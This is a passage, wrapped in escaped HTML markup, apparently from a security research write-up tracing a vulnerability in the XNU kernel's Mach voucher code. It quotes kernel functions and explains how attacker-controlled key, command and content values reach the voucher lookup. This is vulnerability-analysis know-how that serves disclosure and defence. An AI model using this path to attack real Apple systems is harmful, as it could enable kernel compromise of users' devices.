class=\"BGLtzooHlW-c11\"&gt;key&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;command&lt;/span&gt;&lt;span&gt;&amp;nbsp;are arbitrary, controlled dwords. &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;content&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a pointer to a buffer of controlled bytes, and &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;content_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;is the correct size of that input buffer. The MIG layer limits the overall input size of the recipe (which is a collection of sub-recipes) to 5260 bytes, and any input content buffers would have to fit in there.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.191bcb9f8d9273c881068813b7858079e6ae8a8c\"&gt;&lt;/a&gt;&lt;a id=\"t.15\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;static&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&amp;nbsp;kern_return_t&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ipc_execute_voucher_recipe_command&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; ipc_voucher_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;voucher&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; mach_voucher_attr_key_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;key&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; mach_voucher_attr_recipe_command_t command&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; ipc_voucher_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;prev_iv&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; mach_voucher_attr_content_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;content&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; mach_voucher_attr_content_size_t &amp;nbsp; content_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; boolean_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;key_priv&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; iv_index_t prev_val_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; iv_index_t val_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; kern_return_t kr&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;switch&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;command&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;MACH_VOUCHER_ATTR_USER_DATA_STORE&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;isn&amp;#39;t one of the switch statement case values here so the code falls through to the default case:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.66c241fd41870ecdf298b20267a430a3c55fc901\"&gt;&lt;/a&gt;&lt;a id=\"t.16\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;default&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kr &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ipc_replace_voucher_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;voucher&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; key&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; command&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; prev_iv&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; content&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; content_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;!=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;break&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;KERN_SUCCESS&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;Here&amp;#39;s that code:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.2efb8ee4a6d79102545a6af1433eab60fcfedb02\"&gt;&lt;/a&gt;&lt;a id=\"t.17\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;static&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&amp;nbsp;kern_return_t&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ipc_replace_voucher_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ipc_voucher_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; voucher&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_key_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; key&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_recipe_command_t &amp;nbsp; &amp;nbsp; &amp;nbsp;command&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ipc_voucher_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; prev_voucher&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_content_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; content&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_content_size_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;content_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;...&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/*&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* Get the manager for this key_index.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* Returns a reference on the control.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; key_index &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;iv_key_to_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;key&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivgt_lookup&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;key_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;TRUE&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivam&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;IVAM_NULL &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;==&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ivam&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;KERN_INVALID_ARGUMENT&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;..&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_key_to_index&lt;/span&gt;&lt;span&gt;&amp;nbsp;just subtracts 1 from key (assuming it&amp;#39;s valid and not &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;MACH_VOUCHER_ATRR_KEY_ALL&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;):&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.bb233177f78d9071ef9e7fd9994b192f8d1f87d3\"&gt;&lt;/a&gt;&lt;a id=\"t.18\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;static&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;inline&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&amp;nbsp;iv_index_t&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;iv_key_to_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;mach_voucher_attr_key_t key&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;MACH_VOUCHER_ATTR_KEY_ALL &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;==&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;key &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;||&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; MACH_VOUCHER_ATTR_KEY_NUM_WELL_KNOWN &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;key&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;IV_UNUSED_KEYINDEX&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;iv_index_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;key &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;1&lt;/span&gt;&lt;span 